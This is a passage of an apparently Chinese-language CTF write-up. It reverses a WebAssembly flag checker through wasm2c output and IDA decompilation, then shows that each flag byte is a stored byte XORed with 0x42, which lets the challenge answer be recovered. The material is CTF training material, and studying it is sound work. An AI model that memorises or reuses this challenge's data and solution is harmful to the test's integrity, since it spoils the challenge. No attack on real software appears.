class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.c</span></span><br><span class="line"><span class="comment">/* Automically generated by wasm2c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;./flag.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNLIKELY(x) __builtin_expect(!!(x), 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIKELY(x) __builtin_expect(!!(x), 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRAP(x) (wasm_rt_trap(WASM_RT_TRAP_##x), 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FUNC_PROLOGUE                                            \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (++wasm_rt_call_stack_depth &gt; WASM_RT_MAX_CALL_STACK_DEPTH) \</span></span><br><span class="line"><span class="meta">    TRAP(EXHAUSTION)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FUNC_EPILOGUE --wasm_rt_call_stack_depth</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNREACHABLE TRAP(UNREACHABLE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALL_INDIRECT(table, t, ft, x, ...)          \</span></span><br><span class="line"><span class="meta">  (LIKELY((x) &lt; table.size &amp;&amp; table.data[x].func &amp;&amp;  \</span></span><br><span class="line"><span class="meta">          table.data[x].func_type == func_types[ft]) \</span></span><br><span class="line"><span class="meta">       ? ((t)table.data[x].func)(__VA_ARGS__)        \</span></span><br><span class="line"><span class="meta">       : TRAP(CALL_INDIRECT))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> WASM_RT_MEMCHECK_SIGNAL_HANDLER</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEMCHECK(mem, a, t)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEMCHECK(mem, a, t)  \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (UNLIKELY((a) + sizeof(t) &gt; mem-&gt;size)) TRAP(OOB)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_LOAD(name, t1, t2, t3)                        \</span></span><br><span class="line"><span class="meta">  static inline t3 name(wasm_rt_memory_t* mem, u64 addr) &#123;   \</span></span><br><span class="line"><span class="meta">    MEMCHECK(mem, addr, t1);                                 \</span></span><br><span class="line"><span class="meta">    t1 result;                                               \</span></span><br><span class="line"><span class="meta">    __builtin_memcpy(&amp;result, &amp;mem-&gt;data[addr], sizeof(t1)); \</span></span><br><span class="line"><span class="meta">    return (t3)(t2)result;                                   \</span></span><br><span class="line"><span class="meta">  &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_STORE(name, t1, t2)                                     \</span></span><br><span class="line"><span class="meta">  static inline void name(wasm_rt_memory_t* mem, u64 addr, t2 value) &#123; \</span></span><br><span class="line"><span class="meta">    MEMCHECK(mem, addr, t1);                                           \</span></span><br><span class="line"><span class="meta">    t1 wrapped = (t1)value;                                            \</span></span><br><span class="line"><span class="meta">    __builtin_memcpy(&amp;mem-&gt;data[addr], &amp;wrapped, sizeof(t1));          \</span></span><br><span class="line"><span class="meta">  &#125;</span></span><br><span class="line"></span><br><span class="line">DEFINE_LOAD(i32_load, u32, u32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load, u64, u64, u64);</span><br><span class="line">DEFINE_LOAD(f32_load, f32, f32, f32);</span><br><span class="line">DEFINE_LOAD(f64_load, f64, f64, f64);</span><br><span class="line">DEFINE_LOAD(i32_load8_s, s8, s32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load8_s, s8, s64, u64);</span><br><span class="line">DEFINE_LOAD(i32_load8_u, u8, u32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load8_u, u8, u64, u64);</span><br><span class="line">DEFINE_LOAD(i32_load16_s, s16, s32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load16_s, s16, s64, u64);</span><br><span class="line">DEFINE_LOAD(i32_load16_u, u16, u32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load16_u, u16, u64, u64);</span><br><span class="line">DEFINE_LOAD(i64_load32_s, s32, s64, u64);</span><br><span class="line">DEFINE_LOAD(i64_load32_u, u32, u64, u64);</span><br><span class="line">DEFINE_STORE(i32_store, u32, u32);</span><br><span class="line">DEFINE_STORE(i64_store, u64, u64);</span><br><span class="line">DEFINE_STORE(f32_store, f32, f32);</span><br><span class="line">DEFINE_STORE(f64_store, f64, f64);</span><br><span class="line">DEFINE_STORE(i32_store8, u8, u32);</span><br><span class="line">DEFINE_STORE(i32_store16, u16, u32);</span><br><span class="line">DEFINE_STORE(i64_store8, u8, u64);</span><br><span class="line">DEFINE_STORE(i64_store16, u16, u64);</span><br><span class="line">DEFINE_STORE(i64_store32, u32, u64);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_CLZ(x) ((x) ? __builtin_clz(x) : 32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_CLZ(x) ((x) ? __builtin_clzll(x) : 64)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_CTZ(x) ((x) ? __builtin_ctz(x) : 32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_CTZ(x) ((x) ? __builtin_ctzll(x) : 64)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_POPCNT(x) (__builtin_popcount(x))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_POPCNT(x) (__builtin_popcountll(x))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIV_S(ut, min, x, y)                                 \</span></span><br><span class="line"><span class="meta">   ((UNLIKELY((y) == 0)) ?                TRAP(DIV_BY_ZERO)  \</span></span><br><span class="line"><span class="meta">  : (UNLIKELY((x) == min &amp;&amp; (y) == -1)) ? TRAP(INT_OVERFLOW) \</span></span><br><span class="line"><span class="meta">  : (ut)((x) / (y)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REM_S(ut, min, x, y)                                \</span></span><br><span class="line"><span class="meta">   ((UNLIKELY((y) == 0)) ?                TRAP(DIV_BY_ZERO) \</span></span><br><span class="line"><span class="meta">  : (UNLIKELY((x) == min &amp;&amp; (y) == -1)) ? 0                 \</span></span><br><span class="line"><span class="meta">  : (ut)((x) % (y)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_DIV_S(x, y) DIV_S(u32, INT32_MIN, (s32)x, (s32)y)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_DIV_S(x, y) DIV_S(u64, INT64_MIN, (s64)x, (s64)y)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_REM_S(x, y) REM_S(u32, INT32_MIN, (s32)x, (s32)y)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_REM_S(x, y) REM_S(u64, INT64_MIN, (s64)x, (s64)y)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIVREM_U(op, x, y) \</span></span><br><span class="line"><span class="meta">  ((UNLIKELY((y) == 0)) ? TRAP(DIV_BY_ZERO) : ((x) op (y)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIV_U(x, y) DIVREM_U(/, x, y)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REM_U(x, y) DIVREM_U(%, x, y)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROTL(x, y, mask) \</span></span><br><span class="line"><span class="meta">  (((x) <span class="string">&lt;&lt; ((y) &amp; (mask))) | ((x) &gt;</span>&gt; (((mask) - (y) + 1) &amp; (mask))))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROTR(x, y, mask) \</span></span><br><span class="line"><span class="meta">  (((x) &gt;&gt; ((y) &amp; (mask))) | ((x) &lt;&lt; (((mask) - (y) + 1) &amp; (mask))))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_ROTL(x, y) ROTL(x, y, 31)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_ROTL(x, y) ROTL(x, y, 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_ROTR(x, y) ROTR(x, y, 31)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_ROTR(x, y) ROTR(x, y, 63)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FMIN(x, y)                                          \</span></span><br><span class="line"><span class="meta">   ((UNLIKELY((x) != (x))) ? NAN                            \</span></span><br><span class="line"><span class="meta">  : (UNLIKELY((y) != (y))) ? NAN                            \</span></span><br><span class="line"><span class="meta">  : (UNLIKELY((x) == 0 &amp;&amp; (y) == 0)) ? (signbit(x) ? x : y) \</span></span><br><span class="line"><span class="meta">  : (x &lt; y) ? x : y)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FMAX(x, y)                                          \</span></span><br><span class="line"><span class="meta">   ((UNLIKELY((x) != (x))) ? NAN                            \</span></span><br><span class="line"><span class="meta">  : (UNLIKELY((y) != (y))) ? NAN                            \</span></span><br><span class="line"><span class="meta">  : (UNLIKELY((x) == 0 &amp;&amp; (y) == 0)) ? (signbit(x) ? y : x) \</span></span><br><span class="line"><span class="meta">  : (x &gt; y) ? x : y)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUNC_S(ut, st, ft, min, minop, max, x)                             \</span></span><br><span class="line"><span class="meta">  ((UNLIKELY((x) != (x)))                        ? TRAP(INVALID_CONVERSION) \</span></span><br><span class="line"><span class="meta">   : (UNLIKELY(!((x)minop(min) &amp;&amp; (x) &lt; (max)))) ? TRAP(INT_OVERFLOW)       \</span></span><br><span class="line"><span class="meta">                                                 : (ut)(st)(x))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_TRUNC_S_F32(x) TRUNC_S(u32, s32, f32, (f32)INT32_MIN, &gt;=, 2147483648.f, x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_TRUNC_S_F32(x) TRUNC_S(u64, s64, f32, (f32)INT64_MIN, &gt;=, (f32)INT64_MAX, x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_TRUNC_S_F64(x) TRUNC_S(u32, s32, f64, -2147483649., &gt;, 2147483648., x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_TRUNC_S_F64(x) TRUNC_S(u64, s64, f64, (f64)INT64_MIN, &gt;=, (f64)INT64_MAX, x)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUNC_U(ut, ft, max, x)                                            \</span></span><br><span class="line"><span class="meta">  ((UNLIKELY((x) != (x)))                       ? TRAP(INVALID_CONVERSION) \</span></span><br><span class="line"><span class="meta">   : (UNLIKELY(!((x) &gt; (ft)-1 &amp;&amp; (x) &lt; (max)))) ? TRAP(INT_OVERFLOW)       \</span></span><br><span class="line"><span class="meta">                                                : (ut)(x))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_TRUNC_U_F32(x) TRUNC_U(u32, f32, 4294967296.f, x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_TRUNC_U_F32(x) TRUNC_U(u64, f32, (f32)UINT64_MAX, x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_TRUNC_U_F64(x) TRUNC_U(u32, f64, 4294967296.,  x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_TRUNC_U_F64(x) TRUNC_U(u64, f64, (f64)UINT64_MAX, x)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_REINTERPRET(name, t1, t2)  \</span></span><br><span class="line"><span class="meta">  static inline t2 name(t1 x) &#123;           \</span></span><br><span class="line"><span class="meta">    t2 result;                            \</span></span><br><span class="line"><span class="meta">    memcpy(&amp;result, &amp;x, sizeof(result));  \</span></span><br><span class="line"><span class="meta">    return result;                        \</span></span><br><span class="line"><span class="meta">  &#125;</span></span><br><span class="line"></span><br><span class="line">DEFINE_REINTERPRET(f32_reinterpret_i32, u32, f32)</span><br><span class="line">DEFINE_REINTERPRET(i32_reinterpret_f32, f32, u32)</span><br><span class="line">DEFINE_REINTERPRET(f64_reinterpret_i64, u64, f64)</span><br><span class="line">DEFINE_REINTERPRET(i64_reinterpret_f64, f64, u64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u32 func_types[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">init_func_types</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  func_types[<span class="number">0</span>] = wasm_rt_register_func_type(<span class="number">0</span>, <span class="number">1</span>, WASM_RT_I32);</span><br><span class="line">  func_types[<span class="number">1</span>] = wasm_rt_register_func_type(<span class="number">1</span>, <span class="number">1</span>, WASM_RT_I32, WASM_RT_I32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u32 <span class="title function_">w2c_get_buf</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> u32 <span class="title function_">w2c_check_flag</span><span class="params">(u32)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">init_globals</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">wasm_rt_memory_t</span> w2c_memory;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">wasm_rt_table_t</span> w2c_T0;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u32 <span class="title function_">w2c_get_buf</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  FUNC_PROLOGUE;</span><br><span class="line">  u32 w2c_i0;</span><br><span class="line">  w2c_i0 = <span class="number">80u</span>;</span><br><span class="line">  FUNC_EPILOGUE;</span><br><span class="line">  <span class="keyword">return</span> w2c_i0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u32 <span class="title function_">w2c_check_flag</span><span class="params">(u32 w2c_p0)</span> &#123;</span><br><span class="line">  u32 w2c_l1 = <span class="number">0</span>, w2c_l2 = <span class="number">0</span>;</span><br><span class="line">  FUNC_PROLOGUE;</span><br><span class="line">  u32 w2c_i0, w2c_i1, w2c_i2;</span><br><span class="line">  w2c_i0 = <span class="number">0u</span>;</span><br><span class="line">  w2c_l1 = w2c_i0;</span><br><span class="line">  w2c_i0 = <span class="number">0u</span>;</span><br><span class="line">  w2c_l2 = w2c_i0;</span><br><span class="line">  w2c_L0: </span><br><span class="line">    w2c_i0 = w2c_p0;</span><br><span class="line">    w2c_i1 = w2c_l2;</span><br><span class="line">    w2c_i0 += w2c_i1;</span><br><span class="line">    w2c_i0 = i32_load8_u((&amp;w2c_memory), (u64)(w2c_i0));</span><br><span class="line">    w2c_i1 = w2c_l2;</span><br><span class="line">    w2c_i2 = <span class="number">16u</span>;</span><br><span class="line">    w2c_i1 += w2c_i2;</span><br><span class="line">    w2c_i1 = i32_load8_u((&amp;w2c_memory), (u64)(w2c_i1));</span><br><span class="line">    w2c_i0 ^= w2c_i1;</span><br><span class="line">    w2c_i1 = <span class="number">24u</span>;</span><br><span class="line">    w2c_i0 &lt;&lt;= (w2c_i1 &amp; <span class="number">31</span>);</span><br><span class="line">    w2c_i1 = <span class="number">24u</span>;</span><br><span class="line">    w2c_i0 = (u32)((s32)w2c_i0 &gt;&gt; (w2c_i1 &amp; <span class="number">31</span>));</span><br><span class="line">    w2c_i1 = <span class="number">66u</span>;</span><br><span class="line">    w2c_i0 ^= w2c_i1;</span><br><span class="line">    w2c_i1 = w2c_l1;</span><br><span class="line">    w2c_i0 |= w2c_i1;</span><br><span class="line">    w2c_l1 = w2c_i0;</span><br><span class="line">    w2c_i0 = w2c_l2;</span><br><span class="line">    w2c_i1 = <span class="number">1u</span>;</span><br><span class="line">    w2c_i0 += w2c_i1;</span><br><span class="line">    w2c_l2 = w2c_i0;</span><br><span class="line">    w2c_i1 = <span class="number">23u</span>;</span><br><span class="line">    w2c_i0 = w2c_i0 != w2c_i1;</span><br><span class="line">    <span class="keyword">if</span> (w2c_i0) &#123;<span class="keyword">goto</span> w2c_L0;&#125;</span><br><span class="line">  w2c_i0 = w2c_l1;</span><br><span class="line">  w2c_i0 = !(w2c_i0);</span><br><span class="line">  FUNC_EPILOGUE;</span><br><span class="line">  <span class="keyword">return</span> w2c_i0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> u8 data_segment_data_0[] = &#123;</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x2e</span>, <span class="number">0x23</span>, <span class="number">0x25</span>, <span class="number">0x39</span>, <span class="number">0x0a</span>, <span class="number">0x27</span>, <span class="number">0x2e</span>, <span class="number">0x2e</span>, <span class="number">0x2d</span>, <span class="number">0x15</span>, <span class="number">0x27</span>, </span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x03</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x27</span>, <span class="number">0x2f</span>, <span class="number">0x20</span>, <span class="number">0x2e</span>, <span class="number">0x3b</span>, <span class="number">0x3f</span>, <span class="number">0x42</span>, </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> u8 data_segment_data_1[] = &#123;</span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7b</span>, <span class="number">0x54</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x46</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, </span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x49</span>, <span class="number">0x73</span>, <span class="number">0x46</span>, <span class="number">0x61</span>, <span class="number">0x6b</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x00</span>, </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">init_memory</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  wasm_rt_allocate_memory((&amp;w2c_memory), <span class="number">1</span>, <span class="number">65536</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;(w2c_memory.data[<span class="number">16u</span>]), data_segment_data_0, <span class="number">23</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;(w2c_memory.data[<span class="number">48u</span>]), data_segment_data_1, <span class="number">21</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">init_table</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">uint32_t</span> offset;</span><br><span class="line">  wasm_rt_allocate_table((&amp;w2c_T0), <span class="number">0</span>, <span class="number">4294967295</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* export: &#x27;memory&#x27; */</span></span><br><span class="line"><span class="type">wasm_rt_memory_t</span> (*WASM_RT_ADD_PREFIX(Z_memory));</span><br><span class="line"><span class="comment">/* export: &#x27;get_buf&#x27; */</span></span><br><span class="line">u32 (*WASM_RT_ADD_PREFIX(Z_get_bufZ_iv))(<span class="type">void</span>);</span><br><span class="line"><span class="comment">/* export: &#x27;check_flag&#x27; */</span></span><br><span class="line">u32 (*WASM_RT_ADD_PREFIX(Z_check_flagZ_ii))(u32);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">init_exports</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="comment">/* export: &#x27;memory&#x27; */</span></span><br><span class="line">  WASM_RT_ADD_PREFIX(Z_memory) = (&amp;w2c_memory);</span><br><span class="line">  <span class="comment">/* export: &#x27;get_buf&#x27; */</span></span><br><span class="line">  WASM_RT_ADD_PREFIX(Z_get_bufZ_iv) = (&amp;w2c_get_buf);</span><br><span class="line">  <span class="comment">/* export: &#x27;check_flag&#x27; */</span></span><br><span class="line">  WASM_RT_ADD_PREFIX(Z_check_flagZ_ii) = (&amp;w2c_check_flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">WASM_RT_ADD_PREFIX</span><span class="params">(init)</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  init_func_types();</span><br><span class="line">  init_globals();</span><br><span class="line">  init_memory();</span><br><span class="line">  init_table();</span><br><span class="line">  init_exports();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>反编译出来的 C 源码还是很复杂，可以将其再次编译成可执行文件，用 IDA 打开反编译进行静态分析。再次编译需要使用“wasm-rt.h，wasm-rt-impl.c，wasm-rt-impl.h”这三个文件，可以在 wasm2c 的位置下找到。由于在前端源码里主要调用了 check_flag 函数去检查 flag，所以直接看 check_flag 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">w2c_check_flag</span><span class="params">(<span class="type">int</span> buf_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> f; <span class="comment">// ST24_1</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (++wasm_rt_call_stack_depth &gt; <span class="number">0x1F4</span>u )</span><br><span class="line">    wasm_rt_trap(<span class="number">7LL</span>);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    f = i32_load8_u(&amp;w2c_memory, i + buf_addr);  <span class="comment">// 取出 flag 里第 i 个字符</span></span><br><span class="line">    result |= (i32_load8_u(&amp;w2c_memory, i++ + <span class="number">16</span>) ^ f) ^ <span class="number">0x42</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (i != <span class="number">23</span> );</span><br><span class="line">  --wasm_rt_call_stack_depth;</span><br><span class="line">  <span class="keyword">return</span> result == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的 buf_addr 是在前端中调用了 get_buf 函数获取的，该函数直接返回了 80</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">w2c_get_buf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (++wasm_rt_call_stack_depth &gt; <span class="number">0x1F4</span>u )</span><br><span class="line">    wasm_rt_trap(<span class="number">7LL</span>);</span><br><span class="line">  --wasm_rt_call_stack_depth;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">80LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后需要 result 为 0，根据同或的性质，result 在循环中每次迭代时都需要为 0，最后的结果才能使 0，所以表达式 <code>(i32_load8_u(&amp;w2c_memory, i++ + 16) ^ f) ^ 0x42;</code> 将恒为 0。根据异或的性质，则表达式 <code>i32_load8_u(&amp;w2c_memory, i++ + 16) ^ f</code> 将恒为 0x42。根据异或的交换律<code>f = i32_load8_u(&amp;w2c_memory, i + 16) ^ 0x42</code></p>
<p>flag 位于从 w2c_memory 第 16 位开始，长度为 23，这里的 w2c_memory 在 init_memory 函数中初始化，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_memory</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  wasm_rt_allocate_memory(&amp;w2c_memory, <span class="number">1LL</span>, <span class="number">0x10000</span>LL);</span><br><span class="line">  v0 = w2c_memory + <span class="number">16</span>;</span><br><span class="line">  *v0 = data_segment_data_0;</span><br><span class="line">  *(v0 + <span class="number">8</span>) = <span class="number">0x3131032027152D2E</span>LL;</span><br><span class="line">  *(v0 + <span class="number">16</span>) = <span class="number">0x2E202F27</span>;</span><br><span class="line">  *(v0 + <span class="number">20</span>) = <span class="number">0x3F3B</span>;</span><br><span class="line">  *(v0 + <span class="number">22</span>) = <span class="number">0x42</span>;</span><br><span class="line">  v1 = w2c_memory + <span class="number">48</span>;</span><br><span class="line">  *v1 = data_segment_data_1;</span><br><span class="line">  *(v1 + <span class="number">8</span>) = <span class="number">0x46734967616C4673</span>LL;</span><br><span class="line">  *(v1 + <span class="number">16</span>) = <span class="number">0x7D656B61</span>;</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  *(v1 + <span class="number">20</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>w2c_memory 第 16 为开始被赋值为 data_segment_data_0，data_segment_data_0 的定义为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> u8 data_segment_data_0[] = &#123;</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x2e</span>, <span class="number">0x23</span>, <span class="number">0x25</span>, <span class="number">0x39</span>, <span class="number">0x0a</span>, <span class="number">0x27</span>, <span class="number">0x2e</span>, <span class="number">0x2e</span>, <span class="number">0x2d</span>, <span class="number">0x15</span>, <span class="number">0x27</span>,</span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x03</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x27</span>, <span class="number">0x2f</span>, <span class="number">0x20</span>, <span class="number">0x2e</span>, <span class="number">0x3b</span>, <span class="number">0x3f</span>, <span class="number">0x42</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

